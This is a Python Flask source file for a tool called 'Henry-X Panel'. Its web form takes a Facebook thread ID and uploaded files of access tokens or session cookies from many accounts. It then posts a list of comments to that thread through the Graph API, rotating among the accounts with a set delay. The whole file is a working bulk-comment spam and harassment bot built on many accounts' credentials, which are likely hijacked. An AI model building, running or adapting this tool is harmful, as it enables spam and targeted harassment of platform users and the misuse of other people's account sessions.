from flask import Flask, request, redirect, url_for, render_template_string, jsonify
import requests, time, threading, uuid, datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'User-Agent': 'Mozilla/5.0',
}

logs = {}
tasks = {}  # {task_id: {"thread": Thread, "paused": bool, "stop": bool, "info": {...}, "start_time": str}}

def log_message(task_id, msg):
    logs.setdefault(task_id, []).append(msg)
    print(msg)

# -------------------- HOME PANEL --------------------
HOME_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Henry-X Tool</title>
<style>
body {background: linear-gradient(to right, #9932CC, #FF00FF); font-family: 'Segoe UI', sans-serif; color: white; display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0;}
.container {background: rgba(0,0,0,0.7); backdrop-filter: blur(10px); max-width: 650px; margin: 30px auto; padding: 25px; border-radius: 18px; box-shadow: 0 0 25px rgba(255,0,255,0.4);}
input, select {width: 100%; padding: 12px; margin: 6px 0; border-radius: 10px; border: none; background: rgba(255,255,255,0.1); color: white;}
input:focus {outline: 2px solid #FF00FF;}
.button-group {display:flex; flex-direction:column; align-items:center; margin-top:15px;}
.button-group button {width: 80%; max-width: 350px; padding: 12px; margin: 8px 0; font-size: 16px; font-weight:bold; border:none; border-radius: 12px; cursor:pointer; transition: all 0.3s ease;}
.start-btn {background: linear-gradient(45deg,#FF1493,#FF69B4); box-shadow:0 0 15px rgba(255,20,147,0.6);}
.start-btn:hover {transform: scale(1.05);}
.tasks-btn {background: linear-gradient(45deg,#00CED1,#00FFFF); box-shadow:0 0 15px rgba(0,255,255,0.6);}
.tasks-btn:hover {transform: scale(1.05);}
h2 {text-align:center; font-size: 2rem; text-shadow: 0 0 10px #fff;}
</style>
</head>
<body>
<div class="container">
<h2>🚀 HENRY-X PANEL</h2>
<form action="/" method="post" enctype="multipart/form-data">
    <label>Thread ID</label>
    <input type="text" name="threadId" required>
    <label>Prefix</label>
    <input type="text" name="kidx" required>
    <label>Choose Method</label>
    <select name="method" id="method" onchange="toggleFileInputs()" required>
        <option value="token">Token</option>
        <option value="cookies">Cookies</option>
    </select>
    <div id="tokenDiv">
        <label>Token File</label>
        <input type="file" name="tokenFile" accept=".txt">
    </div>
    <div id="cookieDiv" style="display:none;">
        <label>Cookies File</label>
        <input type="file" name="cookiesFile" accept=".txt">
    </div>
    <label>Comments File</label>
    <input type="file" name="commentsFile" accept=".txt" required>
    <label>Delay (Seconds)</label>
    <input type="number" name="time" min="1" required>
    <div class="button-group">
        <button type="submit" class="start-btn">Start Task</button>
        <button type="button" class="tasks-btn" onclick="window.location.href='/tasks-dashboard'">View All Tasks</button>
    </div>
</form>
</div>
<script>
function toggleFileInputs() {
    const method = document.getElementById('method').value;
    document.getElementById('tokenDiv').style.display = method === 'token' ? 'block' : 'none';
    document.getElementById('cookieDiv').style.display = method === 'cookies' ? 'block' : 'none';
}
</script>
</body>
</html>
"""

# -------------------- TASKS DASHBOARD --------------------
TASKS_HTML = """
<!DOCTYPE html>
<html>
<head>
<title>All Tasks</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
body {background: linear-gradient(to right,#1f0036,#2c003e); font-family: 'Segoe UI', sans-serif; color:white; text-align:center; margin:0; padding:20px;}
.grid {display:grid; grid-template-columns:repeat(auto-fit,minmax(300px,1fr)); gap:20px; margin-top:20px;}
.card {background:rgba(255,255,255,0.08); padding:15px; border-radius:15px; box-shadow:0 0 15px rgba(255,0,255,0.2); cursor:pointer; transition:transform 0.3s ease;}
.card:hover {transform:scale(1.03);}
.status-running {color:#0f0; font-weight:bold;}
.status-stopped {color:#f33; font-weight:bold;}
.modal {display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.7); display:flex; align-items:center; justify-content:center;}
.modal-content {background:#111; padding:20px; border-radius:12px; width:90%; max-width:600px; max-height:70vh; overflow-y:auto; color:#0f0; font-family:monospace; box-shadow:0 0 20px #0f0;}
.close {color:white; font-size:20px; float:right; cursor:pointer;}
</style>
</head>
<body>
<h2>📋 Active & Past Tasks</h2>
<div class="grid">
{% for tid, t in tasks.items() %}
<div class="card" onclick="openModal('{{tid}}')">
<p><b>🆔 Task:</b> {{tid}}</p>
<p><b>🧵 Thread:</b> {{t.info.thread_id}}</p>
<p><b>⏱ Time:</b> {{t.start_time}}</p>
<p>Status: <span class="{{'status-running' if not t.stop else 'status-stopped'}}">{{'RUNNING' if not t.stop else 'STOPPED'}}</span></p>
</div>
{% endfor %}
</div>

<div id="logModal" class="modal">
<div class="modal-content">
<span class="close" onclick="closeModal()">&times;</span>
<pre id="logContent">Loading logs...</pre>
</div>
</div>

<script>
async function openModal(tid){
    document.getElementById('logModal').style.display = 'flex';
    const res = await fetch('/logs/'+tid);
    document.getElementById('logContent').innerText = await res.text();
}
function closeModal(){document.getElementById('logModal').style.display='none';}
</script>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        method = request.form['method']
        thread_id = request.form['threadId']
        kidx = request.form['kidx']
        delay = int(request.form['time'])
        comments = request.files['commentsFile'].read().decode().splitlines()
        if method == 'token':
            credentials = request.files['tokenFile'].read().decode().splitlines()
            cred_type = 'access_token'
        else:
            credentials = request.files['cookiesFile'].read().decode().splitlines()
            cred_type = 'Cookie'

        task_id = str(uuid.uuid4())
        tasks[task_id] = {"paused": False, "stop": False,
                          "info": {"thread_id": thread_id},
                          "start_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
        logs[task_id] = []
        t = threading.Thread(target=comment_sender, args=(task_id, thread_id, kidx, delay, credentials, cred_type, comments))
        tasks[task_id]["thread"] = t
        t.start()
        return redirect(url_for("index"))
    return render_template_string(HOME_HTML)

@app.route("/tasks-dashboard")
def task_dashboard():
    return render_template_string(TASKS_HTML, tasks=tasks)

@app.route("/logs/<task_id>")
def get_logs(task_id):
    return "\n".join(logs.get(task_id, []))

def comment_sender(task_id, thread_id, kidx, delay, credentials, cred_type, comments):
    post_url = f"https://graph.facebook.com/v15.0/{thread_id}/comments"
    i = 0
    while i < len(comments) and not tasks[task_id]["stop"]:
        if tasks[task_id]["paused"]:
            time.sleep(1)
            continue
        cred = credentials[i % len(credentials)]
        params = {'message': f"{kidx} {comments[i].strip()}"}
        try:
            if cred_type == 'access_token':
                params['access_token'] = cred
                r = requests.post(post_url, json=params, headers=headers)
            else:
                headers['Cookie'] = cred
                r = requests.post(post_url, data=params, headers=headers)
            log_message(task_id, f"[{'✅' if r.ok else '❌'}] Comment {i+1}")
        except Exception as e:
            log_message(task_id, f"[ERROR] {e}")
        i += 1
        time.sleep(delay)
    log_message(task_id, "🛑 Task Finished or Stopped.")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
